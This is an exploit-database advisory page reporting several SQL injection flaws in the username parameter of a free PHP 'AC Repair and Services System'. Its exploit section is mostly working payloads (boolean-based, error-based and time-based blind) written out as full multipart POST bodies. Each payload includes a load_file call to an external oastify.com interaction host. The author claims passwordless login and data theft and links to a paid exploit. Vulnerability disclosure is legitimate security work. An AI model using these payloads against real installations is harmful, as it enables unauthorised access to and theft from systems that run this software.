---
title: AC Repair and Services System - ARSS-1.0-Copyright©2025-Multiple-SQLi
url: https://cxsecurity.com/issue/WLB-2025040013
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-04-07
fetch_date: 2025-10-06T22:03:32.277093
---

# AC Repair and Services System - ARSS-1.0-Copyright©2025-Multiple-SQLi

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **AC Repair and Services System - ARSS-1.0-Copyright©2025-Multiple-SQLi** **2025.04.06**  **![bg](https://cert.cx/cxstatic/images/flags/bg.png) [nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/) **(BG)** ![bg](https://cert.cx/cxstatic/images/flags/bg.png)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Titles: AC Repair and Services System - ARSS-1.0-Copyright©2025-Multiple-SQLi
# Author: nu11secur1ty
# Date: 04/05/2025
# Vendor: https://github.com/oretnom23
# Software: https://www.sourcecodester.com/php/16513/ac-repair-and-services-system-using-php-and-mysql-source-code-free-download.html
# Reference: https://portswigger.net/web-security/sql-injection
## Description:
The `username` parameter appears to be vulnerable to SQL injection attacks. The payload '+(select load\_file('\\\\dyfx0wnlncvnwnm9ft5rqk60crip6l69xcl48ywn.oastify.com\\puv'))+' was submitted in the username parameter. This payload injects a SQL sub-query that calls MySQL's load\_file function with a UNC file path that references a URL on an external domain. The application interacted with that domain, indicating that the injected SQL query was executed. The attacker can get all sensitive information from this system when he attacks it online, He can login super easily WITHOUT PASSWORD - ONLY USER - bypassing, and can crash or get every sensitive information from him!
STATUS: HIGH-CRITICAL Vulnerability
[+]Exploit:
- SQLi:
```SQLi
---
Parameter: MULTIPART username ((custom) POST)
Type: boolean-based blind
Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
Payload: ------WebKitFormBoundary66yhBXoK0ntvP31K
Content-Disposition: form-data; name="id"
1
------WebKitFormBoundary66yhBXoK0ntvP31K
Content-Disposition: form-data; name="firstname"
admin
------Web
...[SNIP]...
------WebKitFormBoundary66yhBXoK0ntvP31K
Content-Disposition: form-data; name="lastname"
admin
------WebKitFormBoundary66yhBXoK0ntvP31K
Content-Disposition: form-data; name="username"
admin'+(select load\_file('\\\\dyfx0wnlncvnwnm9ft5rqk60crip6l69xcl48ywn.oastify.com\\puv'))+'' RLIKE (SELECT (CASE WHEN (8762=8762) THEN '' ELSE 0x28 END)) AND 'HELG'='HELG
------WebKitFormBoundary66yhBXoK0ntvP31K
Content-Disposition: form-data; name="password"
------WebKitFormBoundary66yhBXoK0ntvP31K
Content-Disposition: form-data; name="img"; filename=""
Type: error-based
Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
Payload: ------WebKitFormBoundary66yhBXoK0ntvP31K
Content-Disposition: form-data; name="id"
1
------WebKitFormBoundary66yhBXoK0ntvP31K
Content-Disposition: form-data; name="firstname"
admin
------Web
...[SNIP]...
------WebKitFormBoundary66yhBXoK0ntvP31K
Content-Disposition: form-data; name="lastname"
admin
------WebKitFormBoundary66yhBXoK0ntvP31K
Content-Disposition: form-data; name="username"
admin'+(select load\_file('\\\\dyfx0wnlncvnwnm9ft5rqk60crip6l69xcl48ywn.oastify.com\\puv'))+'' AND (SELECT 1352 FROM(SELECT COUNT(\*),CONCAT(0x71706a6271,(SELECT (ELT(1352=1352,1))),0x7162707871,FLOOR(RAND(0)\*2))x FROM INFORMATION\_SCHEMA.PLUGINS GROUP BY x)a) AND 'vSKR'='vSKR
------WebKitFormBoundary66yhBXoK0ntvP31K
Content-Disposition: form-data; name="password"
------WebKitFormBoundary66yhBXoK0ntvP31K
Content-Disposition: form-data; name="img"; filename=""
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: ------WebKitFormBoundary66yhBXoK0ntvP31K
Content-Disposition: form-data; name="id"
1
------WebKitFormBoundary66yhBXoK0ntvP31K
Content-Disposition: form-data; name="firstname"
admin
------Web
...[SNIP]...
------WebKitFormBoundary66yhBXoK0ntvP31K
Content-Disposition: form-data; name="lastname"
admin
------WebKitFormBoundary66yhBXoK0ntvP31K
Content-Disposition: form-data; name="username"
admin'+(select load\_file('\\\\dyfx0wnlncvnwnm9ft5rqk60crip6l69xcl48ywn.oastify.com\\puv'))+'' AND (SELECT 9570 FROM (SELECT(SLEEP(7)))xrht) AND 'Serq'='Serq
------WebKitFormBoundary66yhBXoK0ntvP31K
Content-Disposition: form-data; name="password"
------WebKitFormBoundary66yhBXoK0ntvP31K
Content-Disposition: form-data; name="img"; filename=""
---
```
# Reproduce:
[href](https://www.patreon.com/posts/ac-repair-and-1-126001786)
# Buy an exploit only:
[href](https://satoshidisk.com/pay/CO6qme)
# Time spent:
03:15:00
--
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/ https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
0day Exploit DataBase https://0day.today/
home page: https://www.nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
nu11secur1ty <http://nu11secur1ty.com/>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025040013)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top